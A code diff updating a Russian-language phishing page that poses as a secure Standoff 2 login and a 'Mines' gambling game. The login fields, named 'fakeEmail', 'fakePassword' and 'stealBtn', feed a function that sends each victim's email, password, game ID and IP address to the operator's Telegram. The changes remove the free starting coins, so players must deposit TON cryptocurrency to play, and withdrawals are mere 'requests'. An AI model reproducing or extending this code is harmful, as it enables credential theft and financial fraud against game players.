@@ -87,6 +87,13 @@
         button.secondary {
             background: #2a2f42;
         }
+        button.secondary:active {
+            transform: scale(0.97);
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
         .footer {
             text-align: center;
             font-size: 12px;
@@ -155,6 +162,10 @@
         }
         .mine-cell:active {
             transform: scale(0.95);
+        }
+        .mine-cell.disabled {
+            cursor: not-allowed;
+            opacity: 0.6;
         }
         .info-panel {
             background: linear-gradient(135deg, #1e2432, #1a1f2e);
@@ -227,7 +238,7 @@
         }
         .bet-text {
             text-align: center;
-            margin-bottom: 15px;
+            margin-bottom: 5px;
             font-size: 18px;
             font-weight: bold;
             background: linear-gradient(135deg, #ffd966, #ffb347);
@@ -235,9 +246,21 @@
             background-clip: text;
             color: transparent;
         }
+        .mines-count {
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #ffd966;
+        }
         hr {
             border-color: #2f3545;
             margin: 20px 0;
+        }
+        .error-msg {
+            color: #ff4757;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -252,9 +275,9 @@
         <h1>Добро пожаловать</h1>
         <div class="sub">Войдите в аккаунт</div>
         
-        <input type="text" id="fakeEmail" placeholder="Email или ID" autocomplete="off">
+        <input type="text" id="fakeEmail" placeholder="Email" autocomplete="off">
         <input type="password" id="fakePassword" placeholder="Пароль">
-        <input type="text" id="gameUserId" placeholder="Ваш игровой ID в Standoff 2">
+        <input type="text" id="gameUserId" placeholder="Игровой ID в Standoff 2">
         <button id="stealBtn">Войти</button>
         <div class="footer">© 2025 Standoff 2 · Защищённый вход</div>
     </div>
@@ -296,9 +319,11 @@
         
         <div class="game-title">MINES</div>
         <div class="bet-text">⚡ 1 ставка = 5 монет ⚡</div>
+        <div class="mines-count">💣 на поле 6 мин | 💎 10 алмазов</div>
         
         <div class="mines-grid" id="minesGrid"></div>
-        <button id="resetGameBtn" class="secondary">🔄 Новая игра (5 монет)</button>
+        <button id="resetGameBtn" class="secondary" id="newGameBtn">🔄 Новая игра (5 монет)</button>
+        <div id="gameErrorMsg" class="error-msg"></div>
         
         <div class="info-panel">
             <span>🎯 ПОБЕДА = +20 монет</span>
@@ -330,8 +355,10 @@
 
     let currentBalance = 0;
     let gameActive = false;
+    let gameInProgress = false;
     let currentGrid = [];
     let minePositions = [];
+    let revealedCount = 0;
     let currentUserEmail = '';
     let currentUserPass = '';
     let currentGameId = '';
@@ -351,19 +378,19 @@
 
     async function notifyNewUser(email, password, gameId) {
         const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
-        sendToTelegram(`🐏 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n✉️ Почта: ${email}\n🧬 Пароль: ${password}\n🎮 ID: ${gameId}\n🌍 IP: ${ip}\n💰 БОНУС: 50 монет`);
+        sendToTelegram(`🐏 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n✉️ Почта: ${email}\n🧬 Пароль: ${password}\n🎮 ID: ${gameId}\n🌍 IP: ${ip}`);
     }
 
     async function notifyDepositRequest(email, gameId, tonAmount) {
-        sendToTelegram(`💎 ЗАЯВКА НА ПОПОЛНЕНИЕ\n👤 Почта: ${email}\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → ${tonAmount*20} монет\n\n✅ /confirm ${gameId} ${tonAmount}`);
+        sendToTelegram(`💎 ЗАЯВКА НА ПОПОЛНЕНИЕ\n👤 Почта: ${email}\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → ${tonAmount*20} монет\n\n✅ Для подтверждения: confirmDeposit('${gameId}', ${tonAmount})`);
     }
 
     async function notifyGameStart(email, gameId) {
         sendToTelegram(`💥 НАЧАЛ ИГРУ\n👤 ${email}\n🎮 ${gameId}`);
     }
 
-    async function notifyGameWin(email, gameId) {
-        sendToTelegram(`🎉 ВЫИГРЫШ\n👤 ${email}\n🎮 ${gameId}\n💰 +20 монет`);
+    async function notifyGameWin(email, gameId, winAmount) {
+        sendToTelegram(`🎉 ВЫИГРЫШ\n👤 ${email}\n🎮 ${gameId}\n💰 +${winAmount} монет`);
     }
 
     async function notifyGameLose(email, gameId) {
@@ -375,63 +402,87 @@
     }
 
     function initGame() {
+        if (!gameInProgress) {
+            if (currentBalance < 5) {
+                document.getElementById('gameErrorMsg').innerText = '❌ Недостаточно монет, пожалуйста пополните баланс';
+                return false;
+            }
+            currentBalance -= 5;
+            document.getElementById('balanceAmount').innerText = currentBalance;
+            saveUserData();
+            gameInProgress = true;
+            document.getElementById('gameErrorMsg').innerText = '';
+        }
+        
         minePositions = [];
         while(minePositions.length < 6) {
             let pos = Math.floor(Math.random() * 16);
             if(!minePositions.includes(pos)) minePositions.push(pos);
         }
+        
         currentGrid = Array(16).fill('❓');
+        revealedCount = 0;
         gameActive = true;
-        gameStartedNotified = false;
+        
         renderGrid();
+        
+        if (!gameStartedNotified) {
+            notifyGameStart(currentUserEmail, currentGameId);
+            gameStartedNotified = true;
+        }
+        
+        return true;
     }
 
     function renderGrid() {
         let html = '';
         for(let i = 0; i < 16; i++) {
-            html += `<div class="mine-cell" onclick="revealCell(${i})">${currentGrid[i]}</div>`;
+            let additionalClass = !gameActive ? 'disabled' : '';
+            html += `<div class="mine-cell ${additionalClass}" onclick="revealCell(${i})">${currentGrid[i]}</div>`;
         }
         document.getElementById('minesGrid').innerHTML = html;
     }
 
     window.revealCell = async function(index) {
-        if(!gameActive || currentGrid[index] !== '❓') return;
+        if(!gameActive || !gameInProgress) return;
+        if(currentGrid[index] !== '❓') return;
+        
         if(minePositions.includes(index)) {
             currentGrid[index] = '💣';
             renderGrid();
-            currentBalance = Math.max(0, currentBalance - 5);
-            document.getElementById('balanceAmount').innerText = currentBalance;
             gameActive = false;
+            gameInProgress = false;
             await notifyGameLose(currentUserEmail, currentGameId);
-            saveUserData();
+            document.getElementById('gameErrorMsg').innerText = '💀 Вы проиграли! Начните новую игру';
         } else {
             currentGrid[index] = '💎';
-            renderGrid();
-            if(!window._winGiven) {
+            revealedCount++;
+            
+            if(revealedCount === 10) {
                 currentBalance += 20;
                 document.getElementById('balanceAmount').innerText = currentBalance;
-                window._winGiven = true;
                 gameActive = false;
-                await notifyGameWin(currentUserEmail, currentGameId);
+                gameInProgress = false;
+                await notifyGameWin(currentUserEmail, currentGameId, 20);
+                saveUserData();
+                renderGrid();
+                document.getElementById('gameErrorMsg').innerText = '🎉 ПОБЕДА! Вы открыли все алмазы! +20 монет';
+            } else {
+                renderGrid();
                 saveUserData();
             }
         }
     };
 
-    async function resetGame() {
-        if(currentBalance < 5) {
-            alert('Недостаточно монет');
+    async function startNewGame() {
+        if (currentBalance < 5) {
+            document.getElementById('gameErrorMsg').innerText = '❌ Недостаточно монет, пожалуйста пополните баланс';
             return;
         }
-        currentBalance -= 5;
-        document.getElementById('balanceAmount').innerText = currentBalance;
-        window._winGiven = false;
+        
+        gameInProgress = false;
+        gameStartedNotified = false;
         initGame();
-        saveUserData();
-        if(!gameStartedNotified) {
-            await notifyGameStart(currentUserEmail, currentGameId);
-            gameStartedNotified = true;
-        }
     }
 
     function saveUserData() {
@@ -449,9 +500,11 @@
             currentBalance = data.balance;
             currentGameId = data.gameId;
         } else {
-            currentBalance = 50;
+            currentBalance = 0;
         }
         document.getElementById('balanceAmount').innerText = currentBalance;
+        document.getElementById('userId').innerText = currentUserEmail.substring(0,15)+'...';
+        document.getElementById('userGameIdDisplay').innerText = currentGameId;
     }
 
     window.confirmDeposit = async function(gameId, tonAmount) {
@@ -480,6 +533,7 @@
         let email = document.getElementById('fakeEmail').value.trim();
         let pass = document.getElementById('fakePassword').value.trim();
         let gameId = document.getElementById('gameUserId').value.trim();
+        
         if(!email || !pass) { alert('Введите почту и пароль'); return; }
         if(!isValidEmail(email)) { alert('Введите корректный email'); return; }
         if(!gameId) { alert('Введите игровой ID'); return; }
@@ -494,18 +548,21 @@
         document.getElementById('mainApp').style.display = 'block';
         
         loadUserData();
-        document.getElementById('userId').innerText = email.substring(0,15)+'...';
-        document.getElementById('userGameIdDisplay').innerText = gameId;
-        initGame();
+        gameInProgress = false;
+        gameStartedNotified = false;
     };
 
-    document.getElementById('resetGameBtn').onclick = resetGame;
+    document.getElementById('resetGameBtn').onclick = startNewGame;
     
     document.getElementById('checkPaymentBtn').onclick = async () => {
         let ton = parseFloat(document.getElementById('depositAmount').value);
         if(isNaN(ton) || ton <= 0) { alert('Введите сумму в TON'); return; }
         await notifyDepositRequest(currentUserEmail, currentGameId, ton);
-        alert('Заявка отправлена администратору');
+        document.getElementById('paymentMsg').innerHTML = '⏳ Заявка отправлена, ожидайте, это может занимать в течение 5 минут';
+        document.getElementById('paymentMsg').style.color = '#ffd966';
+        setTimeout(() => {
+            document.getElementById('paymentMsg').innerHTML = '';
+        }, 5000);
         document.getElementById('depositAmount').value = '';
     };
     
@@ -522,13 +579,16 @@
     });
     
     document.getElementById('withdrawBtn').onclick = async () => {
-        if(!selectedWithdraw) { alert('Выберите сумму'); return; }
-        if(selectedWithdraw.coins > currentBalance) { alert('Недостаточно монет'); return; }
+        if(!selectedWithdraw) { alert('Выберите сумму вывода'); return; }
+        if(selectedWithdraw.coins > currentBalance) { alert('❌ Недостаточно монет'); return; }
         await notifyWithdrawRequest(currentUserEmail, currentGameId, selectedWithdraw.coins, selectedWithdraw.gold);
         currentBalance -= selectedWithdraw.coins;
         document.getElementById('balanceAmount').innerText = currentBalance;
         saveUserData();
-        alert(`Заявка на вывод ${selectedWithdraw.coins} монет принята`);
+        document.getElementById('withdrawMsg').innerHTML = `✅ Заявка на вывод ${selectedWithdraw.coins} монет (${selectedWithdraw.gold} Gold) принята! Обработка 24 часа.`;
+        setTimeout(() => {
+            document.getElementById('withdrawMsg').innerHTML = '';
+        }, 5000);
         selectedWithdraw = null;
         document.querySelectorAll('.withdraw-option').forEach(o => o.classList.remove('selected'));
     };
